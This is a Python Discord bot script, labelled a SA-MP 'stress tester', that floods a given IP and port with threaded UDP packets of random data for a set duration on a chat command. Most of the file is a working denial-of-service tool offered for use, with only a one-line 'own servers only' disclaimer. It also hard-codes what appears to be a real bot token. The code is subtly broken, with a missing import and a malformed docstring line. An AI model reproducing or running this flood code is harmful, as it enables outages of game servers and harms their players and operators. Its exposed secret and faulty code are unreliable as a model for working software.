#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# ⚡ LI ZANDYA - SAMP STRESS TESTER ⚡
# 🔥 COMMAND: .samp IP PORT DURATION 🔥
# ⚠️ USE ON YOUR OWN SERVERS ONLY ⚠️

import discord
import asyncio
import random
import socket
import struct
import time
import os
from concurrent.futures import ThreadPoolExecutor

# ============================================
# التوكن - ضع التوكن هنا مباشرة
# ============================================
TOKEN = "MTQ5NzI0NjQxMDY0OTg5NTA1Mg.GbTNbr.TK9ernnRI8EJ5Ij45CsRgWeMyKOSCvjYeKG2Zo"

# ============================================
# الإعدادات (مخففة عشان تشتغل على Cloud Shell)
# ============================================
CPU_CORES = os.cpu_count() or 2
MAX_THREADS = 100  # قليل عشان ما ينحظر الحساب
PACKET_SIZE = 2048

# ============================================
# نظام الهجوم
# ============================================
class SAMPStresser:
    def __init__(self):
        self.running = False
        self.executor = ThreadPoolExecutor(max_workers=MAX_THREADS)
    
    async def attack(self, ip, port, duration):
        self.running = True
        sent = 0
        bytes_sent = 0
        
        def worker():
            nonlocal sent, bytes_sent
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
                start = time.time()
                while self.running and time.time() - start < duration:
                    # حزمة SAMP
                    packet = b'SAMP'
                    packet += struct.pack('<I', random.randint(1, 99999))
                    packet += b'\x80'
                    packet += struct.pack('<fffff', 
                        random.uniform(-3000,3000), random.uniform(-3000,3000),
                        random.uniform(-3000,3000), random.uniform(0,360), random.uniform(0,360))
                    packet += struct.pack('<I', random.randint(1,46))
                    packet += struct.pack('<I', 99999)
                    packet += os.urandom(500)
                    sock.sendto(packet, (ip, port))
                    sent += 1
                    bytes_sent += len(packet)
                sock.close()
            except:
                pass
        
        workers = min(MAX_THREADS, 50)
        futures = [self.executor.submit(worker) for _ in range(workers)]
        await asyncio.sleep(duration)
        self.running = False
        
        return sent, bytes_sent

stresser = SAMPStresser()

# ============================================
# البوت - بدون أزرار، بدون تسجيل دخول
# ============================================
intents = discord.Intents.default()
intents.message_content = True
bot = commands.Bot(command_prefix='.', intents=intents)

@bot.event
async def on_ready():
    print(f"""
═══════════════════════════════════════════════════════════
     🔥 LI ZANDYA - SAMP STRESSER ONLINE 🔥
     🤖 Bot: {bot.user}
     📝 Command: .samp IP PORT DURATION
     💀 Example: .samp 192.168.1.1 7777 30
═══════════════════════════════════════════════════════════
    """)

@bot.command()
async def samp(ctx, ip: str, port: int, duration: int):
    """.""" اضرب سيرفر SAMP (استخدم على سيرفرك فقط)
    await ctx.send(f"💀 **ATTACKING {ip}:{port} FOR {duration}s** 💀")
    start = time.time()
    packets, bytes_sent = await stresser.attack(ip, port, duration)
    elapsed = time.time() - start
    rate = packets / elapsed if elapsed > 0 else 0
    mbps = (bytes_sent / elapsed) / 1024 / 1024 if elapsed > 0 else 0
    await ctx.send(f"✅ **ATTACK COMPLETE!**\n📦 Packets: {packets:,}\n⚡ Rate: {rate:,.0f} pps\n📊 Bandwidth: {mbps:.2f} Mbps")

@bot.command()
async def stop(ctx):
    stresser.running = False
    await ctx.send("⏹️ **ATTACK STOPPED!**")

if __name__ == "__main__":
    print("Starting bot...")
    bot.run(TOKEN)
